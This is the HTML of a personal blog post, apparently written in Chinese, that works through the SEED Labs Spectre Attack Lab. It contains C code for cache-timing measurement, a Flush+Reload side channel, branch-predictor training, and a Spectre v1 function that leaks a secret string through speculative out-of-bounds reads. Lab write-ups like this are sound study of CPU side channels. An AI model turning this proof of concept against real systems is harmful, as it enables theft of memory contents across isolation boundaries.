@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Task 1: Reading from Cache versus from Memory在我们访问过一个块之后，再次访问这个块，速度会快很多，这就是 CPU cache 的功劳。换一个说法，就是 CPU 把之前的访问记录在 cache 里面存储了起来。 uint8_t array[10 * 4096];int main(int argc, const char **argv)&#123;  in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spectre-Attack-Lab">
+<meta property="og:url" content="https://ceyewan.github.io/p/5e644521.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="Task 1: Reading from Cache versus from Memory在我们访问过一个块之后，再次访问这个块，速度会快很多，这就是 CPU cache 的功劳。换一个说法，就是 CPU 把之前的访问记录在 cache 里面存储了起来。 uint8_t array[10 * 4096];int main(int argc, const char **argv)&#123;  in">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118223706892.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118224216763.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118232818983.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221119002129901.png">
+<meta property="article:published_time" content="2022-11-18T16:27:23.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:23:16.625Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="Spectre">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118223706892.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Spectre-Attack-Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/157470a3.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/a4ae304e.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/5e644521.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/5e644521.html&text=Spectre-Attack-Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/5e644521.html&is_video=false&description=Spectre-Attack-Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spectre-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/5e644521.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/5e644521.html&name=Spectre-Attack-Lab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/5e644521.html&t=Spectre-Attack-Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Reading-from-Cache-versus-from-Memory"><span class="toc-number">1.</span> <span class="toc-text">Task 1: Reading from Cache versus from Memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Using-Cache-as-a-Side-Channel"><span class="toc-number">2.</span> <span class="toc-text">Task 2: Using Cache as a Side Channel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Out-of-Order-Execution-and-Branch-Prediction"><span class="toc-number">3.</span> <span class="toc-text">Task 3: Out-of-Order Execution and Branch Prediction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-The-Spectre-Attack"><span class="toc-number">4.</span> <span class="toc-text">Task 4: The Spectre Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Improve-the-Attack-Accuracy"><span class="toc-number">5.</span> <span class="toc-text">Task 5: Improve the Attack Accuracy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Steal-the-Entire-Secret-String"><span class="toc-number">6.</span> <span class="toc-text">Task 6: Steal the Entire Secret String</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Spectre-Attack-Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-18T16:27:23.000Z" class="dt-published" itemprop="datePublished">2022-11-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-SystemSecurity/">SeedLabs/SystemSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Spectre/" rel="tag">Spectre</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h2><p>在我们访问过一个块之后，再次访问这个块，速度会快很多，这就是 <code>CPU cache</code> 的功劳。换一个说法，就是 <code>CPU</code> 把之前的访问记录在 <code>cache</code> 里面存储了起来。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">10</span> * <span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Initialize the array</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    <span class="built_in">array</span>[i * <span class="number">4096</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// FLUSH the array from the CPU cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    _mm_clflush(&amp;<span class="built_in">array</span>[i * <span class="number">4096</span>]);</span><br><span class="line">  <span class="comment">// Access some of the array items</span></span><br><span class="line">  <span class="built_in">array</span>[<span class="number">3</span> * <span class="number">4096</span>] = <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span> * <span class="number">4096</span>] = <span class="number">200</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span>];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;</span>, i, (<span class="type">int</span>)time2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，第 3 和第 7 个块的访问时间比其他的少得多，多次重复后，我们可以发现这个阈值大概就是 <code>80</code> 左右。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118223706892.png" alt="image-20221118223706892"></p>
+<p>我们可以看到第 <code>0</code> 个块的访问时间异常的久，偶尔也会比较短。这是因为第 <code>0</code> 个块可能会受数组前其他地址访问的影响。其实虽然我们划分了每个块都是 <code>4096</code> 的大小，但是并不是内存就是按照我们这样分块的，我们这样只是可以保证取的这些值不出现在同一个块中罢了，不能保证 <code>[0, 4095]</code> 就是同一个块。因此，下面我们访问块时都用 <code>array[i * 4096 + DELTA]</code>，增加一个偏移，避免第 <code>0</code> 个元素被其他内容影响，这个偏移我们一般设置为 <code>1024</code>。</p>
+<h2 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h2><p>侧信道攻击，核心思想是通过加密软件或硬件运行时产生的各种泄漏信息获取密文信息。这里我们使用的是 <code>cache</code>。如果我们使用了 <code>array</code> 数组并且只访问了第 <code>secret</code> 块，那么就可以通过访问时间的长短得到 <code>secret</code> 的结果，这里我们把阈值设置为 <code>80</code>，也就是说，当结果小于 <code>80</code> 的时候我们认为这是从 <code>cache</code> 中捕获的数据。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118224216763.png" alt="image-20221118224216763"></p>
+<h2 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#Task-3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Task 3: Out-of-Order Execution and Branch Prediction"></a>Task 3: Out-of-Order Execution and Branch Prediction</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">data = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (x &lt; size) &#123;</span><br><span class="line">    data = data + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>CPU</code> 的乱序执行，例如下面这个逻辑，当 <code>x &gt;= size</code> 的时候，语句就一定不执行吗？其实并不是的。现在的 <code>CPU</code> 采用了乱序执行和分支预测的优化，如果我们前几次执行，都满足条件，那么这次执行，<code>CPU</code> 会预测也能满足条件，从而使得语句也被执行（乱序执行），当后续判断出条件不成立的时候，<code>CPU</code> 会将程序执行的结果回滚，假装什么都没发生。</p>
+<p>但是，很遗憾的是，并不是什么都没发生，并不是所有的结果都被抹去了，<code>cache</code> 上其实有存档的！！！虽然对于段代码没有用，但是我们可以利用这种特性，构造某些恶意代码，首先，我们调用 <code>victim(i)</code> 欺骗 <code>CPU</code>，引发分支预测执行，然后清空缓存，接下来执行 <code>victim(97)</code> 这样，虽然这个代码不该被执行，但是因为分支预测和乱序执行的存在，这段代码其实是执行了的，我们可以从 <code>cache</code> 中捕捉到这种变化。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; size) <span class="comment">// size = 10</span></span><br><span class="line">  &#123;</span><br><span class="line">    temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FLUSH the probing array</span></span><br><span class="line">  flushSideChannel();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim()</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    victim(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Exploit the out-of-order execution</span></span><br><span class="line">  _mm_clflush(&amp;size); <span class="comment">// @</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    _mm_clflush(&amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA]);</span><br><span class="line">  victim(<span class="number">97</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// RELOAD the probing array</span></span><br><span class="line">  reloadSideChannel();</span><br><span class="line">    </span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// array[97*4096 + 1024] is in cache.</span></span><br><span class="line"><span class="comment">// The Secret = 97.</span></span><br></pre></td></tr></table></figure>
+
+<p>如果我们注释掉 <code>@</code> 那行语句，得不到结果。我认为是因为如果没有清空 <code>size</code> 的缓存，那么分支判断语句执行的速度就会快于我们希望执行的语句，导致我们的希望的语句不会被执行。</p>
+<p>如果我们把 <code>victim(i);</code> 修改为 <code>victim(i + 20);</code>，同样不能得到结果，因为这样我们无法训练 <code>CPU</code> 了，由于 <code>CPU</code> 没有足够的把握觉得分支会执行，那么它就会放弃预测。</p>
+<h2 id="Task-4-The-Spectre-Attack"><a href="#Task-4-The-Spectre-Attack" class="headerlink" title="Task 4: The Spectre Attack"></a>Task 4: The Spectre Attack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;Some Secret Value&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span> * <span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">    <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside restrictedAccess().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    restrictedAccess(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    _mm_clflush(&amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123; &#125;</span><br><span class="line">  <span class="comment">// Ask restrictedAccess() to return the secret in out-of-order execution.</span></span><br><span class="line">  s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s * <span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于这个程序，虽然我们进行边界判断，但是我们可以通过训练 <code>CPU</code> 使得预测分支执行绕过，那么 <code>buffer[x]</code> 会被执行。如果这个 <code>x</code> 的值是 <code>secret</code> 和 <code>buffer</code> 地址的差值，比如是 <code>-1</code>，那么我们其实是 <code>return</code> 了 <code>secret[0]</code> 的值。然后这个值调用了 <code>array[s * 4096 + DELTA] += 88;</code>，加 <code>88</code> 不是重点，重点是我们让这块内存到 <code>cache</code> 中来了。最后，通过遍历数组，我们可以拿到哪一块的时间段，对应的值就是 <code>s</code> 就是 <code>secret[0]</code>，然后如法炮制，把 <code>secret</code> 中的所有数据都能拿到。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221118232818983.png" alt="image-20221118232818983"></p>
+<h2 id="Task-5-Improve-the-Attack-Accuracy"><a href="#Task-5-Improve-the-Attack-Accuracy" class="headerlink" title="Task 5: Improve the Attack Accuracy"></a>Task 5: Improve the Attack Accuracy</h2><p>完善一下，因为 <code>cache</code> 中也有很多噪声，并不是每次都能拿到最正确的那个值。我们可以多次重复实验，取一个出现次数最多的值，那么这个值就八九不离十了。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;*****\n&quot;</span>); <span class="comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">  spectreAttack(index_beyond);</span><br><span class="line">  usleep(<span class="number">10</span>);</span><br><span class="line">  reloadSideChannelImproved();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们执行代码，发现得到的结果总是为 <code>0</code>，我们需要修复代码了，很显然，是因为第 <code>0</code> 个块被缓存了，可是我们清空缓存了呀，这是因为，我们使得分支预测成功的概率不是 <code>100%</code>，但分支预测失败，就会返回 <code>0</code>，并且还有可能是其他内存带动了第 <code>0</code> 块缓存。这个时候我们只要去掉第 <code>0</code> 块就行了，不参与计算。</p>
+<p>如果去掉那个看似无用的 <code>printf</code> 语句，那么函数是无法执行，<code>CPU</code> 的秘密我劝你别猜（好吧，估计是操作系统的锅，实验文档说 <code>ubuntu16</code> 可以去掉，20 不行）。我设置了不同的 <code>usleep</code> 时间，确实有改变，但是这个改变似乎是因为不同的执行之间本来就有的误差。</p>
+<h2 id="Task-6-Steal-the-Entire-Secret-String"><a href="#Task-6-Steal-the-Entire-Secret-String" class="headerlink" title="Task 6: Steal the Entire Secret String"></a>Task 6: Steal the Entire Secret String</h2><p>写一个循环即可</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221119002129901.png" alt="image-20221119002129901"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Reading-from-Cache-versus-from-Memory"><span class="toc-number">1.</span> <span class="toc-text">Task 1: Reading from Cache versus from Memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Using-Cache-as-a-Side-Channel"><span class="toc-number">2.</span> <span class="toc-text">Task 2: Using Cache as a Side Channel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Out-of-Order-Execution-and-Branch-Prediction"><span class="toc-number">3.</span> <span class="toc-text">Task 3: Out-of-Order Execution and Branch Prediction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-The-Spectre-Attack"><span class="toc-number">4.</span> <span class="toc-text">Task 4: The Spectre Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Improve-the-Attack-Accuracy"><span class="toc-number">5.</span> <span class="toc-text">Task 5: Improve the Attack Accuracy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Steal-the-Entire-Secret-String"><span class="toc-number">6.</span> <span class="toc-text">Task 6: Steal the Entire Secret String</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/5e644521.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/5e644521.html&text=Spectre-Attack-Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/5e644521.html&is_video=false&description=Spectre-Attack-Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spectre-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/5e644521.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/5e644521.html&title=Spectre-Attack-Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/5e644521.html&name=Spectre-Attack-Lab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/5e644521.html&t=Spectre-Attack-Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
